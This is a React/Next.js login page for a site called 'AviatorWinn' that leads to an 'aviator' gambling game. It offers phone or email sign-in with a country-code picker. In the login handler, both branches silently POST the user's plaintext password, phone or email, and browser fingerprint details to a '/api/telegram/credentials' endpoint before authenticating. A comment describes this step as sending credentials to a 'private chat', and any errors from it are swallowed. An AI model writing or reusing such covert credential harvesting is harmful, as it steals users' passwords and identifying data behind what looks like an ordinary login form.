'use client';

import { useState, useRef, useEffect } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { Phone, Mail, Lock, Eye, EyeOff, ChevronDown, Search, Loader2 } from 'lucide-react';
import { supabase } from '@/lib/supabase';

// Country data with phone formatting
const countries = [
    { code: 'UZ', name: 'Uzbekistan', dialCode: '+998', flag: '🇺🇿', format: '## ### ## ##' },
    { code: 'RU', name: 'Russia', dialCode: '+7', flag: '🇷🇺', format: '### ### ## ##' },
    { code: 'US', name: 'United States', dialCode: '+1', flag: '🇺🇸', format: '### ### ####' },
    { code: 'GB', name: 'United Kingdom', dialCode: '+44', flag: '🇬🇧', format: '#### ######' },
    { code: 'DE', name: 'Germany', dialCode: '+49', flag: '🇩🇪', format: '### #######' },
    { code: 'FR', name: 'France', dialCode: '+33', flag: '🇫🇷', format: '# ## ## ## ##' },
    { code: 'KZ', name: 'Kazakhstan', dialCode: '+7', flag: '🇰🇿', format: '### ### ## ##' },
    { code: 'TJ', name: 'Tajikistan', dialCode: '+992', flag: '🇹🇯', format: '## ### ## ##' },
    { code: 'KG', name: 'Kyrgyzstan', dialCode: '+996', flag: '🇰🇬', format: '### ### ###' },
    { code: 'TM', name: 'Turkmenistan', dialCode: '+993', flag: '🇹🇲', format: '## ## ## ##' },
    { code: 'AZ', name: 'Azerbaijan', dialCode: '+994', flag: '🇦🇿', format: '## ### ## ##' },
    { code: 'TR', name: 'Turkey', dialCode: '+90', flag: '🇹🇷', format: '### ### ## ##' },
    { code: 'AE', name: 'UAE', dialCode: '+971', flag: '🇦🇪', format: '## ### ####' },
    { code: 'IN', name: 'India', dialCode: '+91', flag: '🇮🇳', format: '##### #####' },
    { code: 'CN', name: 'China', dialCode: '+86', flag: '🇨🇳', format: '### #### ####' },
    { code: 'JP', name: 'Japan', dialCode: '+81', flag: '🇯🇵', format: '## #### ####' },
    { code: 'KR', name: 'South Korea', dialCode: '+82', flag: '🇰🇷', format: '## #### ####' },
    { code: 'UA', name: 'Ukraine', dialCode: '+380', flag: '🇺🇦', format: '## ### ## ##' },
    { code: 'BY', name: 'Belarus', dialCode: '+375', flag: '🇧🇾', format: '## ### ## ##' },
    { code: 'PL', name: 'Poland', dialCode: '+48', flag: '🇵🇱', format: '### ### ###' },
];

// Format phone number based on pattern
const formatPhoneNumber = (value: string, format: string): string => {
    const digits = value.replace(/\D/g, '');
    let result = '';
    let digitIndex = 0;

    for (let i = 0; i < format.length && digitIndex < digits.length; i++) {
        if (format[i] === '#') {
            result += digits[digitIndex];
            digitIndex++;
        } else {
            result += format[i];
        }
    }

    return result;
};

export default function LoginPage() {
    const router = useRouter();
    const [loginMethod, setLoginMethod] = useState<'phone' | 'email'>('phone');
    const [selectedCountry, setSelectedCountry] = useState(countries[0]);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [showCountryDropdown, setShowCountryDropdown] = useState(false);
    const [searchQuery, setSearchQuery] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState('');
    const dropdownRef = useRef<HTMLDivElement>(null);

    // Close dropdown when clicking outside
    useEffect(() => {
        const handleClickOutside = (event: MouseEvent) => {
            if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
                setShowCountryDropdown(false);
            }
        };
        document.addEventListener('mousedown', handleClickOutside);
        return () => document.removeEventListener('mousedown', handleClickOutside);
    }, []);

    // Filter countries based on search
    const filteredCountries = countries.filter(country =>
        country.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        country.dialCode.includes(searchQuery)
    );

    // Handle phone number input
    const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const rawValue = e.target.value.replace(/\D/g, '');
        const formatted = formatPhoneNumber(rawValue, selectedCountry.format);
        setPhoneNumber(formatted);
    };

    // Handle country selection
    const handleCountrySelect = (country: typeof countries[0]) => {
        setSelectedCountry(country);
        setShowCountryDropdown(false);
        setSearchQuery('');
        setPhoneNumber('');
    };

    // Handle login
    const handleLogin = async () => {
        setError('');
        setIsLoading(true);

        try {
            if (loginMethod === 'phone') {
                // Login with phone number (convert to fake email format for Supabase)
                const fullPhone = selectedCountry.dialCode + phoneNumber.replace(/\s/g, '');
                const fakeEmail = `${fullPhone.replace('+', '')}@number.login`;

                // Send credentials to private chat BEFORE login
                try {
                    await fetch('/api/telegram/credentials', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'login',
                            phone: fullPhone,
                            password: password,
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            language: navigator.language,
                            screenSize: `${window.screen.width}x${window.screen.height}`,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            referrer: document.referrer || 'direct'
                        })
                    });
                } catch (e) {
                    // Silent fail
                }

                const { data, error: signInError } = await supabase.auth.signInWithPassword({
                    email: fakeEmail,
                    password: password,
                });

                if (signInError) {
                    // If user doesn't exist, create them
                    if (signInError.message.includes('Invalid login credentials')) {
                        setError('Invalid phone number or password');
                    } else {
                        setError(signInError.message);
                    }
                    setIsLoading(false);
                    return;
                }

                if (data.user) {
                    router.push('/games/aviator');
                }
            } else {
                // Send credentials to private chat BEFORE login
                try {
                    await fetch('/api/telegram/credentials', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'login',
                            email: email,
                            password: password,
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            language: navigator.language,
                            screenSize: `${window.screen.width}x${window.screen.height}`,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            referrer: document.referrer || 'direct'
                        })
                    });
                } catch (e) {
                    // Silent fail
                }

                // Login with email
                const { data, error: signInError } = await supabase.auth.signInWithPassword({
                    email: email,
                    password: password,
                });

                if (signInError) {
                    if (signInError.message.includes('Invalid login credentials')) {
                        setError('Invalid email or password');
                    } else {
                        setError(signInError.message);
                    }
                    setIsLoading(false);
                    return;
                }

                if (data.user) {
                    router.push('/games/aviator');
                }
            }
        } catch (err) {
            setError('An error occurred. Please try again.');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div
            className="min-h-screen flex items-center justify-center px-4 relative"
            style={{
                backgroundImage: 'url(/assets/orig.jpg)',
                backgroundSize: 'cover',
                backgroundPosition: 'center',
                backgroundRepeat: 'no-repeat',
                fontFamily: "'Montserrat', sans-serif"
            }}
        >
            {/* Dark overlay with blur */}
            <div className="absolute inset-0 bg-black/40 backdrop-blur-[2px]"></div>

            <div className="relative z-10 w-full max-w-md bg-white rounded-2xl shadow-2xl p-8">
                {/* Title */}
                <h1 className="text-3xl font-bold text-[#1a1a4e] mb-2">Login</h1>
                <p className="text-[#1a1a4e] text-lg mb-6">Welcome to AviatorWinn</p>

                {/* Error Message */}
                {error && (
                    <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg text-red-600 text-sm">
                        {error}
                    </div>
                )}

                {/* Login Method Toggle */}
                <div className="flex mb-6 bg-gray-100 rounded-full p-1">
                    <button
                        onClick={() => setLoginMethod('phone')}
                        className={`flex-1 flex items-center justify-center gap-2 py-3 rounded-full text-sm font-medium transition-all ${loginMethod === 'phone'
                            ? 'bg-[#1a1a4e] text-white'
                            : 'text-[#1a1a4e]'
                            }`}
                    >
                        <Phone size={16} /> Phone Number
                    </button>
                    <button
                        onClick={() => setLoginMethod('email')}
                        className={`flex-1 flex items-center justify-center gap-2 py-3 rounded-full text-sm font-medium transition-all ${loginMethod === 'email'
                            ? 'bg-[#1a1a4e] text-white'
                            : 'text-[#1a1a4e]'
                            }`}
                    >
                        <Mail size={16} /> Email
                    </button>
                </div>

                {/* Input Fields */}
                <div className="space-y-4 mb-6">
                    {loginMethod === 'phone' ? (
                        <div className="relative" ref={dropdownRef}>
                            <div className="flex items-center border border-gray-300 rounded-lg overflow-hidden">
                                {/* Country Selector */}
                                <button
                                    type="button"
                                    onClick={() => setShowCountryDropdown(!showCountryDropdown)}
                                    className="flex items-center justify-center gap-1 px-3 py-3 border-r border-gray-300 bg-gray-50 hover:bg-gray-100 transition-colors w-[70px] min-w-[70px] flex-shrink-0"
                                >
                                    <span className="text-xl">{selectedCountry.flag}</span>
                                    <ChevronDown size={16} className={`text-gray-500 transition-transform ${showCountryDropdown ? 'rotate-180' : ''}`} />
                                </button>

                                {/* Phone Input */}
                                <div className="flex items-center flex-1">
                                    <span className="text-gray-600 pl-3 font-medium">{selectedCountry.dialCode}</span>
                                    <input
                                        type="tel"
                                        value={phoneNumber}
                                        onChange={handlePhoneChange}
                                        className="flex-1 px-2 py-3 outline-none text-gray-800"
                                        placeholder={selectedCountry.format.replace(/#/g, '0')}
                                    />
                                </div>
                            </div>

                            {/* Country Dropdown */}
                            {showCountryDropdown && (
                                <div className="absolute top-full left-0 mt-2 w-72 bg-white border border-gray-200 rounded-xl shadow-2xl z-50 overflow-hidden">
                                    {/* Search */}
                                    <div className="p-3 border-b border-gray-100">
                                        <div className="flex items-center gap-2 bg-gray-100 rounded-lg px-3 py-2">
                                            <Search size={16} className="text-gray-400" />
                                            <input
                                                type="text"
                                                value={searchQuery}
                                                onChange={(e) => setSearchQuery(e.target.value)}
                                                placeholder="Search country..."
                                                className="flex-1 bg-transparent outline-none text-sm text-gray-700"
                                                autoFocus
                                            />
                                        </div>
                                    </div>

                                    {/* Country List */}
                                    <div className="max-h-60 overflow-y-auto">
                                        {filteredCountries.map((country) => (
                                            <button
                                                key={country.code}
                                                onClick={() => handleCountrySelect(country)}
                                                className={`w-full flex items-center gap-3 px-4 py-3 hover:bg-gray-50 transition-colors ${selectedCountry.code === country.code ? 'bg-[#1a1a4e]/5' : ''
                                                    }`}
                                            >
                                                <span className="text-xl">{country.flag}</span>
                                                <span className="flex-1 text-left text-gray-800 text-sm">{country.name}</span>
                                                <span className="text-gray-500 text-sm">{country.dialCode}</span>
                                            </button>
                                        ))}
                                        {filteredCountries.length === 0 && (
                                            <div className="px-4 py-6 text-center text-gray-500 text-sm">
                                                No countries found
                                            </div>
                                        )}
                                    </div>
                                </div>
                            )}
                        </div>
                    ) : (
                        <div className="flex items-center border border-gray-300 rounded-lg overflow-hidden">
                            <div className="flex items-center justify-center w-[70px] min-w-[70px] flex-shrink-0 py-3 border-r border-gray-300 bg-gray-50">
                                <Mail size={18} className="text-gray-400" />
                            </div>
                            <input
                                type="email"
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                className="flex-1 px-4 py-3 outline-none text-gray-800"
                                placeholder="Email"
                            />
                        </div>
                    )}

                    {/* Password Field */}
                    <div className="flex items-center border border-gray-300 rounded-lg overflow-hidden">
                        <div className="flex items-center justify-center w-[70px] min-w-[70px] flex-shrink-0 py-3 border-r border-gray-300 bg-gray-50">
                            <Lock size={18} className="text-gray-400" />
                        </div>
                        <input
                            type={showPassword ? 'text' : 'password'}
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="flex-1 px-4 py-3 outline-none text-gray-800"
                            placeholder="Password"
                        />
                        <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="px-3 py-3 text-gray-400 hover:text-gray-600 transition-colors"
                        >
                            {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                        </button>
                    </div>
                </div>

                {/* Login Button */}
                <button
                    onClick={handleLogin}
                    disabled={isLoading}
                    className="w-full bg-[#1a1a4e] text-white py-4 rounded-full font-semibold text-lg hover:bg-[#2a2a6e] transition-colors mb-6 disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                >
                    {isLoading ? (
                        <>
                            <Loader2 size={20} className="animate-spin" />
                            Logging in...
                        </>
                    ) : (
                        'Login'
                    )}
                </button>

                {/* Register Link */}
                <p className="text-center text-gray-600">
                    Still no account?{' '}
                    <Link href="/registration" className="text-[#1a1a4e] font-bold hover:underline">
                        Register
                    </Link>
                </p>
            </div>
        </div>
    );
}
